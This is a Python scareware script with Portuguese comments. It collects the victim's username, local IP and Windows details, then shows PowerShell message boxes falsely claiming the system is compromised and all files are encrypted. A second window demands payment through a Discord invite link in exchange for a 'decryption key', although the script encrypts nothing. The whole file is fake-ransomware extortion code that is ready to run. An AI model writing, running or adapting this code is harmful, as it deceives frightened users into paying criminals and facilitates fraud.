import os
import platform
import socket
import subprocess
import time

def get_system_info():
    """Coleta IP, Modelo do Windows e outras infos."""
    ip = socket.gethostbyname(socket.gethostname())
    os_name = platform.system()
    os_release = platform.release()
    os_version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    
    # Tenta obter o modelo específico do Windows (ex: Windows 10 Pro)
    try:
        # Executa wmic para tentar pegar mais detalhes se necessário, mas platform já é bom
        # Vamos usar o nome do usuário também para personalizar a mensagem
        username = os.getlogin()
    except:
        username = "Usuário"

    info_text = f"""
╔══════════════════════════════════════════════════════════╗
║                  ⚠️  SISTEMA COMPROMETIDO  ⚠️           ║
╚══════════════════════════════════════════════════════════╝

📡 DADOS DO SISTEMA COMPROMETIDO:
• Usuário: {username}
• IP Local: {ip}
• SO: {os_name} {os_release} (Build {os_version})
• Arquitetura: {machine}
• Processador: {processor}

🔒 SEUS ARQUIVOS FORAM CIFRADOS!
Todos os seus documentos, fotos e segredos estão em risco.
"""
    return info_text

def show_message_box(title, message, icon="critical"):
    """
    Abre uma janela nativa do Windows usando msgbox (via subprocess) 
    ou uma alternativa em Python puro se o usuário não tiver tkinter.
    Neste caso, usaremos o 'msg' do Windows via subprocess para máxima compatibilidade
    e aparência nativa de erro/segurança.
    """
    # Escapa aspas para não quebrar o comando
    safe_message = message.replace('"', '\\"')
    
    # /s: silencia o som (opcional, você pode remover para ter som)
    # /icon: critical (X vermelho), info (i), question (?)
    cmd = f'msg /time:10 "{title}" "{safe_message}"'
    
    # Como o comando 'msg' é para consoles remotos, ele não funciona bem para janelas gráficas locais.
    # Vamos usar o 'mshta' ou 'powershell' para criar uma janela gráfica real.
    
    powershell_script = f'''
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("{safe_message}", "{title}", 'OK', 'Critical')
'''
    
    # Executa via PowerShell para garantir uma janela gráfica bonita
    subprocess.run(['powershell', '-NoProfile', '-Command', powershell_script], check=False)

def main():
    print("Gerando relatório de comprometimento...")
    info = get_system_info()
    
    # 1. Exibe a janela principal de "Hackeado"
    # Esta janela ficará aberta até o usuário fechar ou até o tempo passar.
    # Como o requisito pede que feche após 10 segundos, vamos usar um timer no script principal
    # e abrir a janela de forma bloqueante ou usar threading.
    
    # Para simplificar e garantir o timing exato de 10s independentemente da interação do usuário:
    # Vamos abrir a janela, esperar 10 segundos e abrir a segunda.
    
    print(info) # Mostra no terminal para debug
    
    # Janela 1: "Você foi hackeado"
    print("Abrindo janela de alerta...")
    show_message_box("⚠️ VOCÊ FOI HACKEADO ⚠️", info)
    
    print("Aguardando 10 segundos...")
    time.sleep(10)
    
    # Janela 2: Instruções de pagamento
    print("Abrindo janela de resgate...")
    show_message_box("💰 COMO SALVAR SEU PC", 
                     "Para salvar seu pc pague no canal pague do nosso discord em:\n\n"
                     "https://discord.gg/spDuk2mwcp\n\n"
                     "Após o pagamento, você receberá a chave de decodificação.\n"
                     "Não reinicie seu computador.")

if __name__ == "__main__":
    main()